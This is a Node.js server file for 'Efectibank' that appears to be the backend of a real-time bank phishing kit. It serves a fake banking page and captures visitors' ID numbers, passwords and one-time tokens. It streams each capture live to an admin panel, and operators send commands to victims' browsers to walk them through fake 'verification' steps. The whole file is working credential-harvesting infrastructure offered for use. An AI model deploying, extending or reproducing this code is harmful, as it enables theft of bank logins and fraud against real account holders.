const express = require("express");
const path = require("path");
const http = require("http");
const fs = require("fs");
const os = require("os");
const { Server } = require("socket.io");

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: "*" },
  pingTimeout: 30000,
  pingInterval: 10000,
});

const port = Number(process.env.PORT) || 8080;
const publicDir = path.join(__dirname, "public");
const storePath = path.join(os.tmpdir(), "efectibank-sessions-state.json");

app.disable("x-powered-by");
app.use(express.json({ limit: "1mb" }));

function noCache(res) {
  res.setHeader("Cache-Control", "no-store, no-cache, must-revalidate, proxy-revalidate");
  res.setHeader("Pragma", "no-cache");
  res.setHeader("Expires", "0");
}

app.get(["/banca", "/banca/", "/banca.html"], (_req, res) => {
  noCache(res);
  res.sendFile(path.join(publicDir, "banca.html"));
});

app.get(["/panel", "/panel/", "/panel.html"], (_req, res) => {
  noCache(res);
  res.sendFile(path.join(publicDir, "panel.html"));
});

app.get(["/admin", "/admin/", "/admin.html"], (_req, res) => {
  noCache(res);
  res.sendFile(path.join(publicDir, "admin.html"));
});

app.use(
  express.static(publicDir, {
    redirect: false,
    setHeaders(res, filePath) {
      const name = path.basename(filePath).toLowerCase();
      if (name.includes(".js") || name.startsWith("js") || name === "q8a4rrtl79" || /^\d+$/.test(name)) {
        res.type("application/javascript; charset=utf-8");
      }
      if (name === "banca.js" || name === "panel-admin.js" || name === "banca.html" || name === "admin.html") {
        noCache(res);
      }
    },
  })
);

app.get("/health", (_req, res) => {
  res.status(200).json({ ok: true });
});

// Estado en memoria + respaldo en disco + sincronización CRDT entre instancias
const sessions = new Map();
const tombstones = new Map(); // id -> deletedAtMs
let clearedAllAtMs = 0;

function loadStateFromDisk() {
  try {
    if (!fs.existsSync(storePath)) return;
    const raw = JSON.parse(fs.readFileSync(storePath, "utf8"));
    if (raw && typeof raw.clearedAllAtMs === "number") {
      clearedAllAtMs = Math.max(clearedAllAtMs, raw.clearedAllAtMs);
    }
    if (raw && raw.tombstones && typeof raw.tombstones === "object") {
      for (const [k, v] of Object.entries(raw.tombstones)) {
        const ts = Number(v) || 0;
        if (ts > (tombstones.get(k) || 0)) tombstones.set(k, ts);
      }
    }
    if (raw && Array.isArray(raw.sessions)) {
      for (const s of raw.sessions) {
        if (!s || !s.id) continue;
        const ts = Number(s.updatedAtMs) || 0;
        if (ts <= clearedAllAtMs || ts <= (tombstones.get(s.id) || 0)) continue;
        const cur = sessions.get(s.id);
        if (!cur || ts > (cur.updatedAtMs || 0)) {
          sessions.set(s.id, s);
        }
      }
    }
  } catch (_e) {}
}

function saveStateToDisk() {
  try {
    const payload = {
      clearedAllAtMs,
      tombstones: Object.fromEntries(tombstones),
      sessions: Array.from(sessions.values()),
    };
    fs.writeFileSync(storePath, JSON.stringify(payload), "utf8");
  } catch (_e) {}
}

loadStateFromDisk();

function isDeleted(id, updatedAtMs) {
  const ts = Number(updatedAtMs) || 0;
  if (ts <= clearedAllAtMs) return true;
  const tomb = tombstones.get(id) || 0;
  if (ts <= tomb) return true;
  return false;
}

function purgeDeletedSessions() {
  for (const [id, s] of sessions.entries()) {
    if (isDeleted(id, s.updatedAtMs)) {
      sessions.delete(id);
    }
  }
}

function getFilteredSessions() {
  loadStateFromDisk();
  purgeDeletedSessions();
  return Array.from(sessions.values())
    .filter((s) => {
      return (
        (s.docNumber && String(s.docNumber).trim().length > 0) ||
        (s.password && String(s.password).trim().length > 0) ||
        (s.token && String(s.token).trim().length > 0)
      );
    })
    .sort((a, b) => (a.createdAtMs || 0) - (b.createdAtMs || 0));
}

function getSyncPayload() {
  return {
    sessions: getFilteredSessions(),
    tombstones: Object.fromEntries(tombstones),
    clearedAllAtMs,
  };
}

function broadcastSessions() {
  const payload = getSyncPayload();
  io.to("admins").emit("sessions:sync", payload);
  io.to("admins").emit("sessions:update", payload.sessions);
}

function upsertSession(data, meta = {}) {
  loadStateFromDisk();
  const key = (data && data.clientId) || (data && data.id) || meta.socketId;
  if (!key) return null;

  const prevTomb = tombstones.get(key) || 0;
  const existing = sessions.get(key);
  const prevMs = existing ? Number(existing.updatedAtMs) || 0 : 0;
  const nowMs = Math.max(Date.now(), clearedAllAtMs + 1, prevTomb + 1, prevMs + 1);

  let session = existing;
  if (!session) {
    session = {
      id: key,
      ip: meta.ip || data.ip || "127.0.0.1",
      userAgent: meta.userAgent || data.userAgent || "",
      docType: "DNI",
      docNumber: "",
      password: "",
      token: "",
      step: "doc",
      status: "Esperando verificación por el operador",
      pendingCommand: null,
      ackedCmdId: null,
      createdAtMs: nowMs,
      updatedAtMs: nowMs,
      updatedAt: new Date().toLocaleTimeString(),
    };
  }

  if (meta.socketId) session.socketId = meta.socketId;
  if (data.docType) session.docType = data.docType;
  if (data.docNumber !== undefined && String(data.docNumber).trim() !== "") {
    session.docNumber = String(data.docNumber).trim();
  }
  if (data.password !== undefined) {
    if (data.password !== "" || data.clearPass) {
      session.password = data.password;
    }
  }
  if (data.token !== undefined) {
    if (data.token !== "" || data.clearToken) {
      session.token = data.token;
    }
  }
  if (data.step) session.step = data.step;
  if (data.status) {
    session.status = data.status;
    session.pendingCommand = null;
  }
  session.connected = true;
  session.updatedAtMs = nowMs;
  session.updatedAt = new Date().toLocaleTimeString();

  sessions.set(key, session);
  saveStateToDisk();
  broadcastSessions();
  return session;
}

function dispatchOperatorCommand({ targetId, action, message, cmdId: existingCmdId }) {
  loadStateFromDisk();
  const session = sessions.get(targetId);
  const prevMs = session ? Number(session.updatedAtMs) || 0 : 0;
  const nowMs = Math.max(Date.now(), prevMs + 1);
  const cmdId = existingCmdId || nowMs + "_" + Math.random().toString(36).slice(2, 7);
  const payload = { cmdId, targetId, action, message, createdAtMs: nowMs };
  if (session) {
    session.lastAction = action;
    session.status = `Operación enviada: ${action}`;
    session.pendingCommand = payload;
    session.updatedAtMs = nowMs;
    session.updatedAt = new Date().toLocaleTimeString();
    sessions.set(targetId, session);
    saveStateToDisk();
    broadcastSessions();
  }
  io.to(targetId).emit("operator:action", payload);
  if (session && session.socketId && session.socketId !== targetId) {
    io.to(session.socketId).emit("operator:action", payload);
  }
  return payload;
}

function deleteSessionById(targetId) {
  loadStateFromDisk();
  let maxSessionMs = Date.now();
  for (const s of sessions.values()) {
    if ((s.updatedAtMs || 0) > maxSessionMs) maxSessionMs = s.updatedAtMs;
  }
  const tombMs = Math.max(Date.now(), clearedAllAtMs + 1, maxSessionMs + 1);
  if (targetId) {
    const cur = sessions.get(targetId);
    const targetTombMs = Math.max(Date.now(), (cur?.updatedAtMs || 0) + 1, (tombstones.get(targetId) || 0) + 1);
    tombstones.set(targetId, targetTombMs);
    sessions.delete(targetId);
  } else {
    clearedAllAtMs = tombMs;
    for (const id of sessions.keys()) {
      tombstones.set(id, tombMs);
    }
    sessions.clear();
  }
  saveStateToDisk();
  broadcastSessions();
}

// Endpoints HTTP + CRDT Sync
app.get("/api/sessions", (_req, res) => {
  noCache(res);
  res.json(getFilteredSessions());
});

app.post("/api/sync", (req, res) => {
  noCache(res);
  loadStateFromDisk();
  const body = req.body || {};

  if (typeof body.clearedAllAtMs === "number" && body.clearedAllAtMs > clearedAllAtMs) {
    clearedAllAtMs = body.clearedAllAtMs;
  }

  if (body.tombstones && typeof body.tombstones === "object") {
    for (const [id, ts] of Object.entries(body.tombstones)) {
      const numTs = Number(ts) || 0;
      if (numTs > (tombstones.get(id) || 0)) {
        tombstones.set(id, numTs);
      }
    }
  }

  purgeDeletedSessions();

  if (Array.isArray(body.sessions)) {
    for (const incoming of body.sessions) {
      if (!incoming || !incoming.id) continue;
      const inMs = Number(incoming.updatedAtMs) || 0;
      if (isDeleted(incoming.id, inMs)) continue;

      const existing = sessions.get(incoming.id);
      if (!existing) {
        sessions.set(incoming.id, incoming);
        if (incoming.pendingCommand && incoming.ackedCmdId !== incoming.pendingCommand.cmdId) {
          io.to(incoming.id).emit("operator:action", incoming.pendingCommand);
        }
      } else {
        // Merge fields keeping newest data
        const exMs = Number(existing.updatedAtMs) || 0;
        if (inMs > exMs) {
          const keepSocketId = existing.socketId;
          const keepAcked = existing.ackedCmdId;
          Object.assign(existing, incoming);
          if (keepSocketId) existing.socketId = keepSocketId;
          if (keepAcked && existing.pendingCommand && existing.pendingCommand.cmdId === keepAcked) {
            existing.ackedCmdId = keepAcked;
            existing.pendingCommand = null;
          }
          sessions.set(incoming.id, existing);
        }
        // Check if incoming has a newer unacknowledged pendingCommand
        if (
          incoming.pendingCommand &&
          incoming.pendingCommand.cmdId &&
          existing.ackedCmdId !== incoming.pendingCommand.cmdId
        ) {
          const inCmdMs = Number(incoming.pendingCommand.createdAtMs) || 0;
          const exCmdMs = existing.pendingCommand ? Number(existing.pendingCommand.createdAtMs) || 0 : 0;
          if (inCmdMs >= exCmdMs) {
            existing.pendingCommand = incoming.pendingCommand;
            existing.status = incoming.status || existing.status;
            io.to(existing.id).emit("operator:action", existing.pendingCommand);
            if (existing.socketId && existing.socketId !== existing.id) {
              io.to(existing.socketId).emit("operator:action", existing.pendingCommand);
            }
          }
        }
      }
    }
  }

  saveStateToDisk();
  res.json(getSyncPayload());
});

app.post("/api/session", (req, res) => {
  noCache(res);
  const session = upsertSession(req.body || {}, {
    ip: req.ip || req.socket?.remoteAddress || "127.0.0.1",
    userAgent: req.headers["user-agent"] || "",
  });
  res.json({ ok: true, session });
});

app.get("/api/session/:id/poll", (req, res) => {
  noCache(res);
  loadStateFromDisk();
  const session = sessions.get(req.params.id);
  if (!session || !session.pendingCommand) {
    return res.json({ command: null });
  }
  if (session.ackedCmdId === session.pendingCommand.cmdId) {
    session.pendingCommand = null;
    saveStateToDisk();
    return res.json({ command: null });
  }
  const command = session.pendingCommand;
  session.ackedCmdId = command.cmdId;
  session.pendingCommand = null;
  session.updatedAtMs = Math.max(Date.now(), (session.updatedAtMs || 0) + 1);
  saveStateToDisk();
  return res.json({ command });
});

app.post("/api/command", (req, res) => {
  noCache(res);
  const { targetId, action, message, cmdId, createdAtMs } = req.body || {};
  if (!targetId || !action) {
    return res.status(400).json({ ok: false });
  }
  const payload = dispatchOperatorCommand({ targetId, action, message, cmdId, createdAtMs });
  return res.json({ ok: true, payload, sync: getSyncPayload() });
});

app.post("/api/delete_session", (req, res) => {
  noCache(res);
  const { targetId, deletedAtMs } = req.body || {};
  deleteSessionById(targetId, deletedAtMs);
  return res.json({ ok: true, sync: getSyncPayload() });
});

io.on("connection", (socket) => {
  socket.on("admin:join", () => {
    socket.join("admins");
    const payload = getSyncPayload();
    socket.emit("sessions:sync", payload);
    socket.emit("sessions:update", payload.sessions);
  });

  socket.on("client:register", ({ clientId } = {}) => {
    if (clientId) {
      socket.join(clientId);
      const session = sessions.get(clientId);
      if (session) {
        session.socketId = socket.id;
        session.connected = true;
        if (session.pendingCommand && session.ackedCmdId !== session.pendingCommand.cmdId) {
          socket.emit("operator:action", session.pendingCommand);
        }
      }
    }
  });

  const handleClientData = (data = {}) => {
    const key = data.clientId || socket.id;
    socket.join(key);
    upsertSession(
      { ...data, clientId: key },
      {
        socketId: socket.id,
        ip: socket.handshake.address || "127.0.0.1",
        userAgent: socket.handshake.headers["user-agent"] || "",
      }
    );
  };

  socket.on("client:init", handleClientData);
  socket.on("client:update", handleClientData);

  socket.on("client:ack", ({ clientId, cmdId } = {}) => {
    if (!clientId || !cmdId) return;
    const session = sessions.get(clientId);
    if (session) {
      session.ackedCmdId = cmdId;
      if (session.pendingCommand && session.pendingCommand.cmdId === cmdId) {
        session.pendingCommand = null;
      }
      saveStateToDisk();
    }
  });

  socket.on("admin:command", ({ targetId, action, message, cmdId, createdAtMs } = {}) => {
    if (!targetId || !action) return;
    dispatchOperatorCommand({ targetId, action, message, cmdId, createdAtMs });
  });

  socket.on("admin:delete_session", ({ targetId, deletedAtMs } = {}) => {
    deleteSessionById(targetId, deletedAtMs);
  });

  socket.on("disconnect", () => {
    for (const session of sessions.values()) {
      if (session.socketId === socket.id || session.id === socket.id) {
        session.connected = false;
      }
    }
  });
});

server.listen(port, "0.0.0.0", () => {
  console.log(`Efectibank listo en el puerto ${port}`);
});



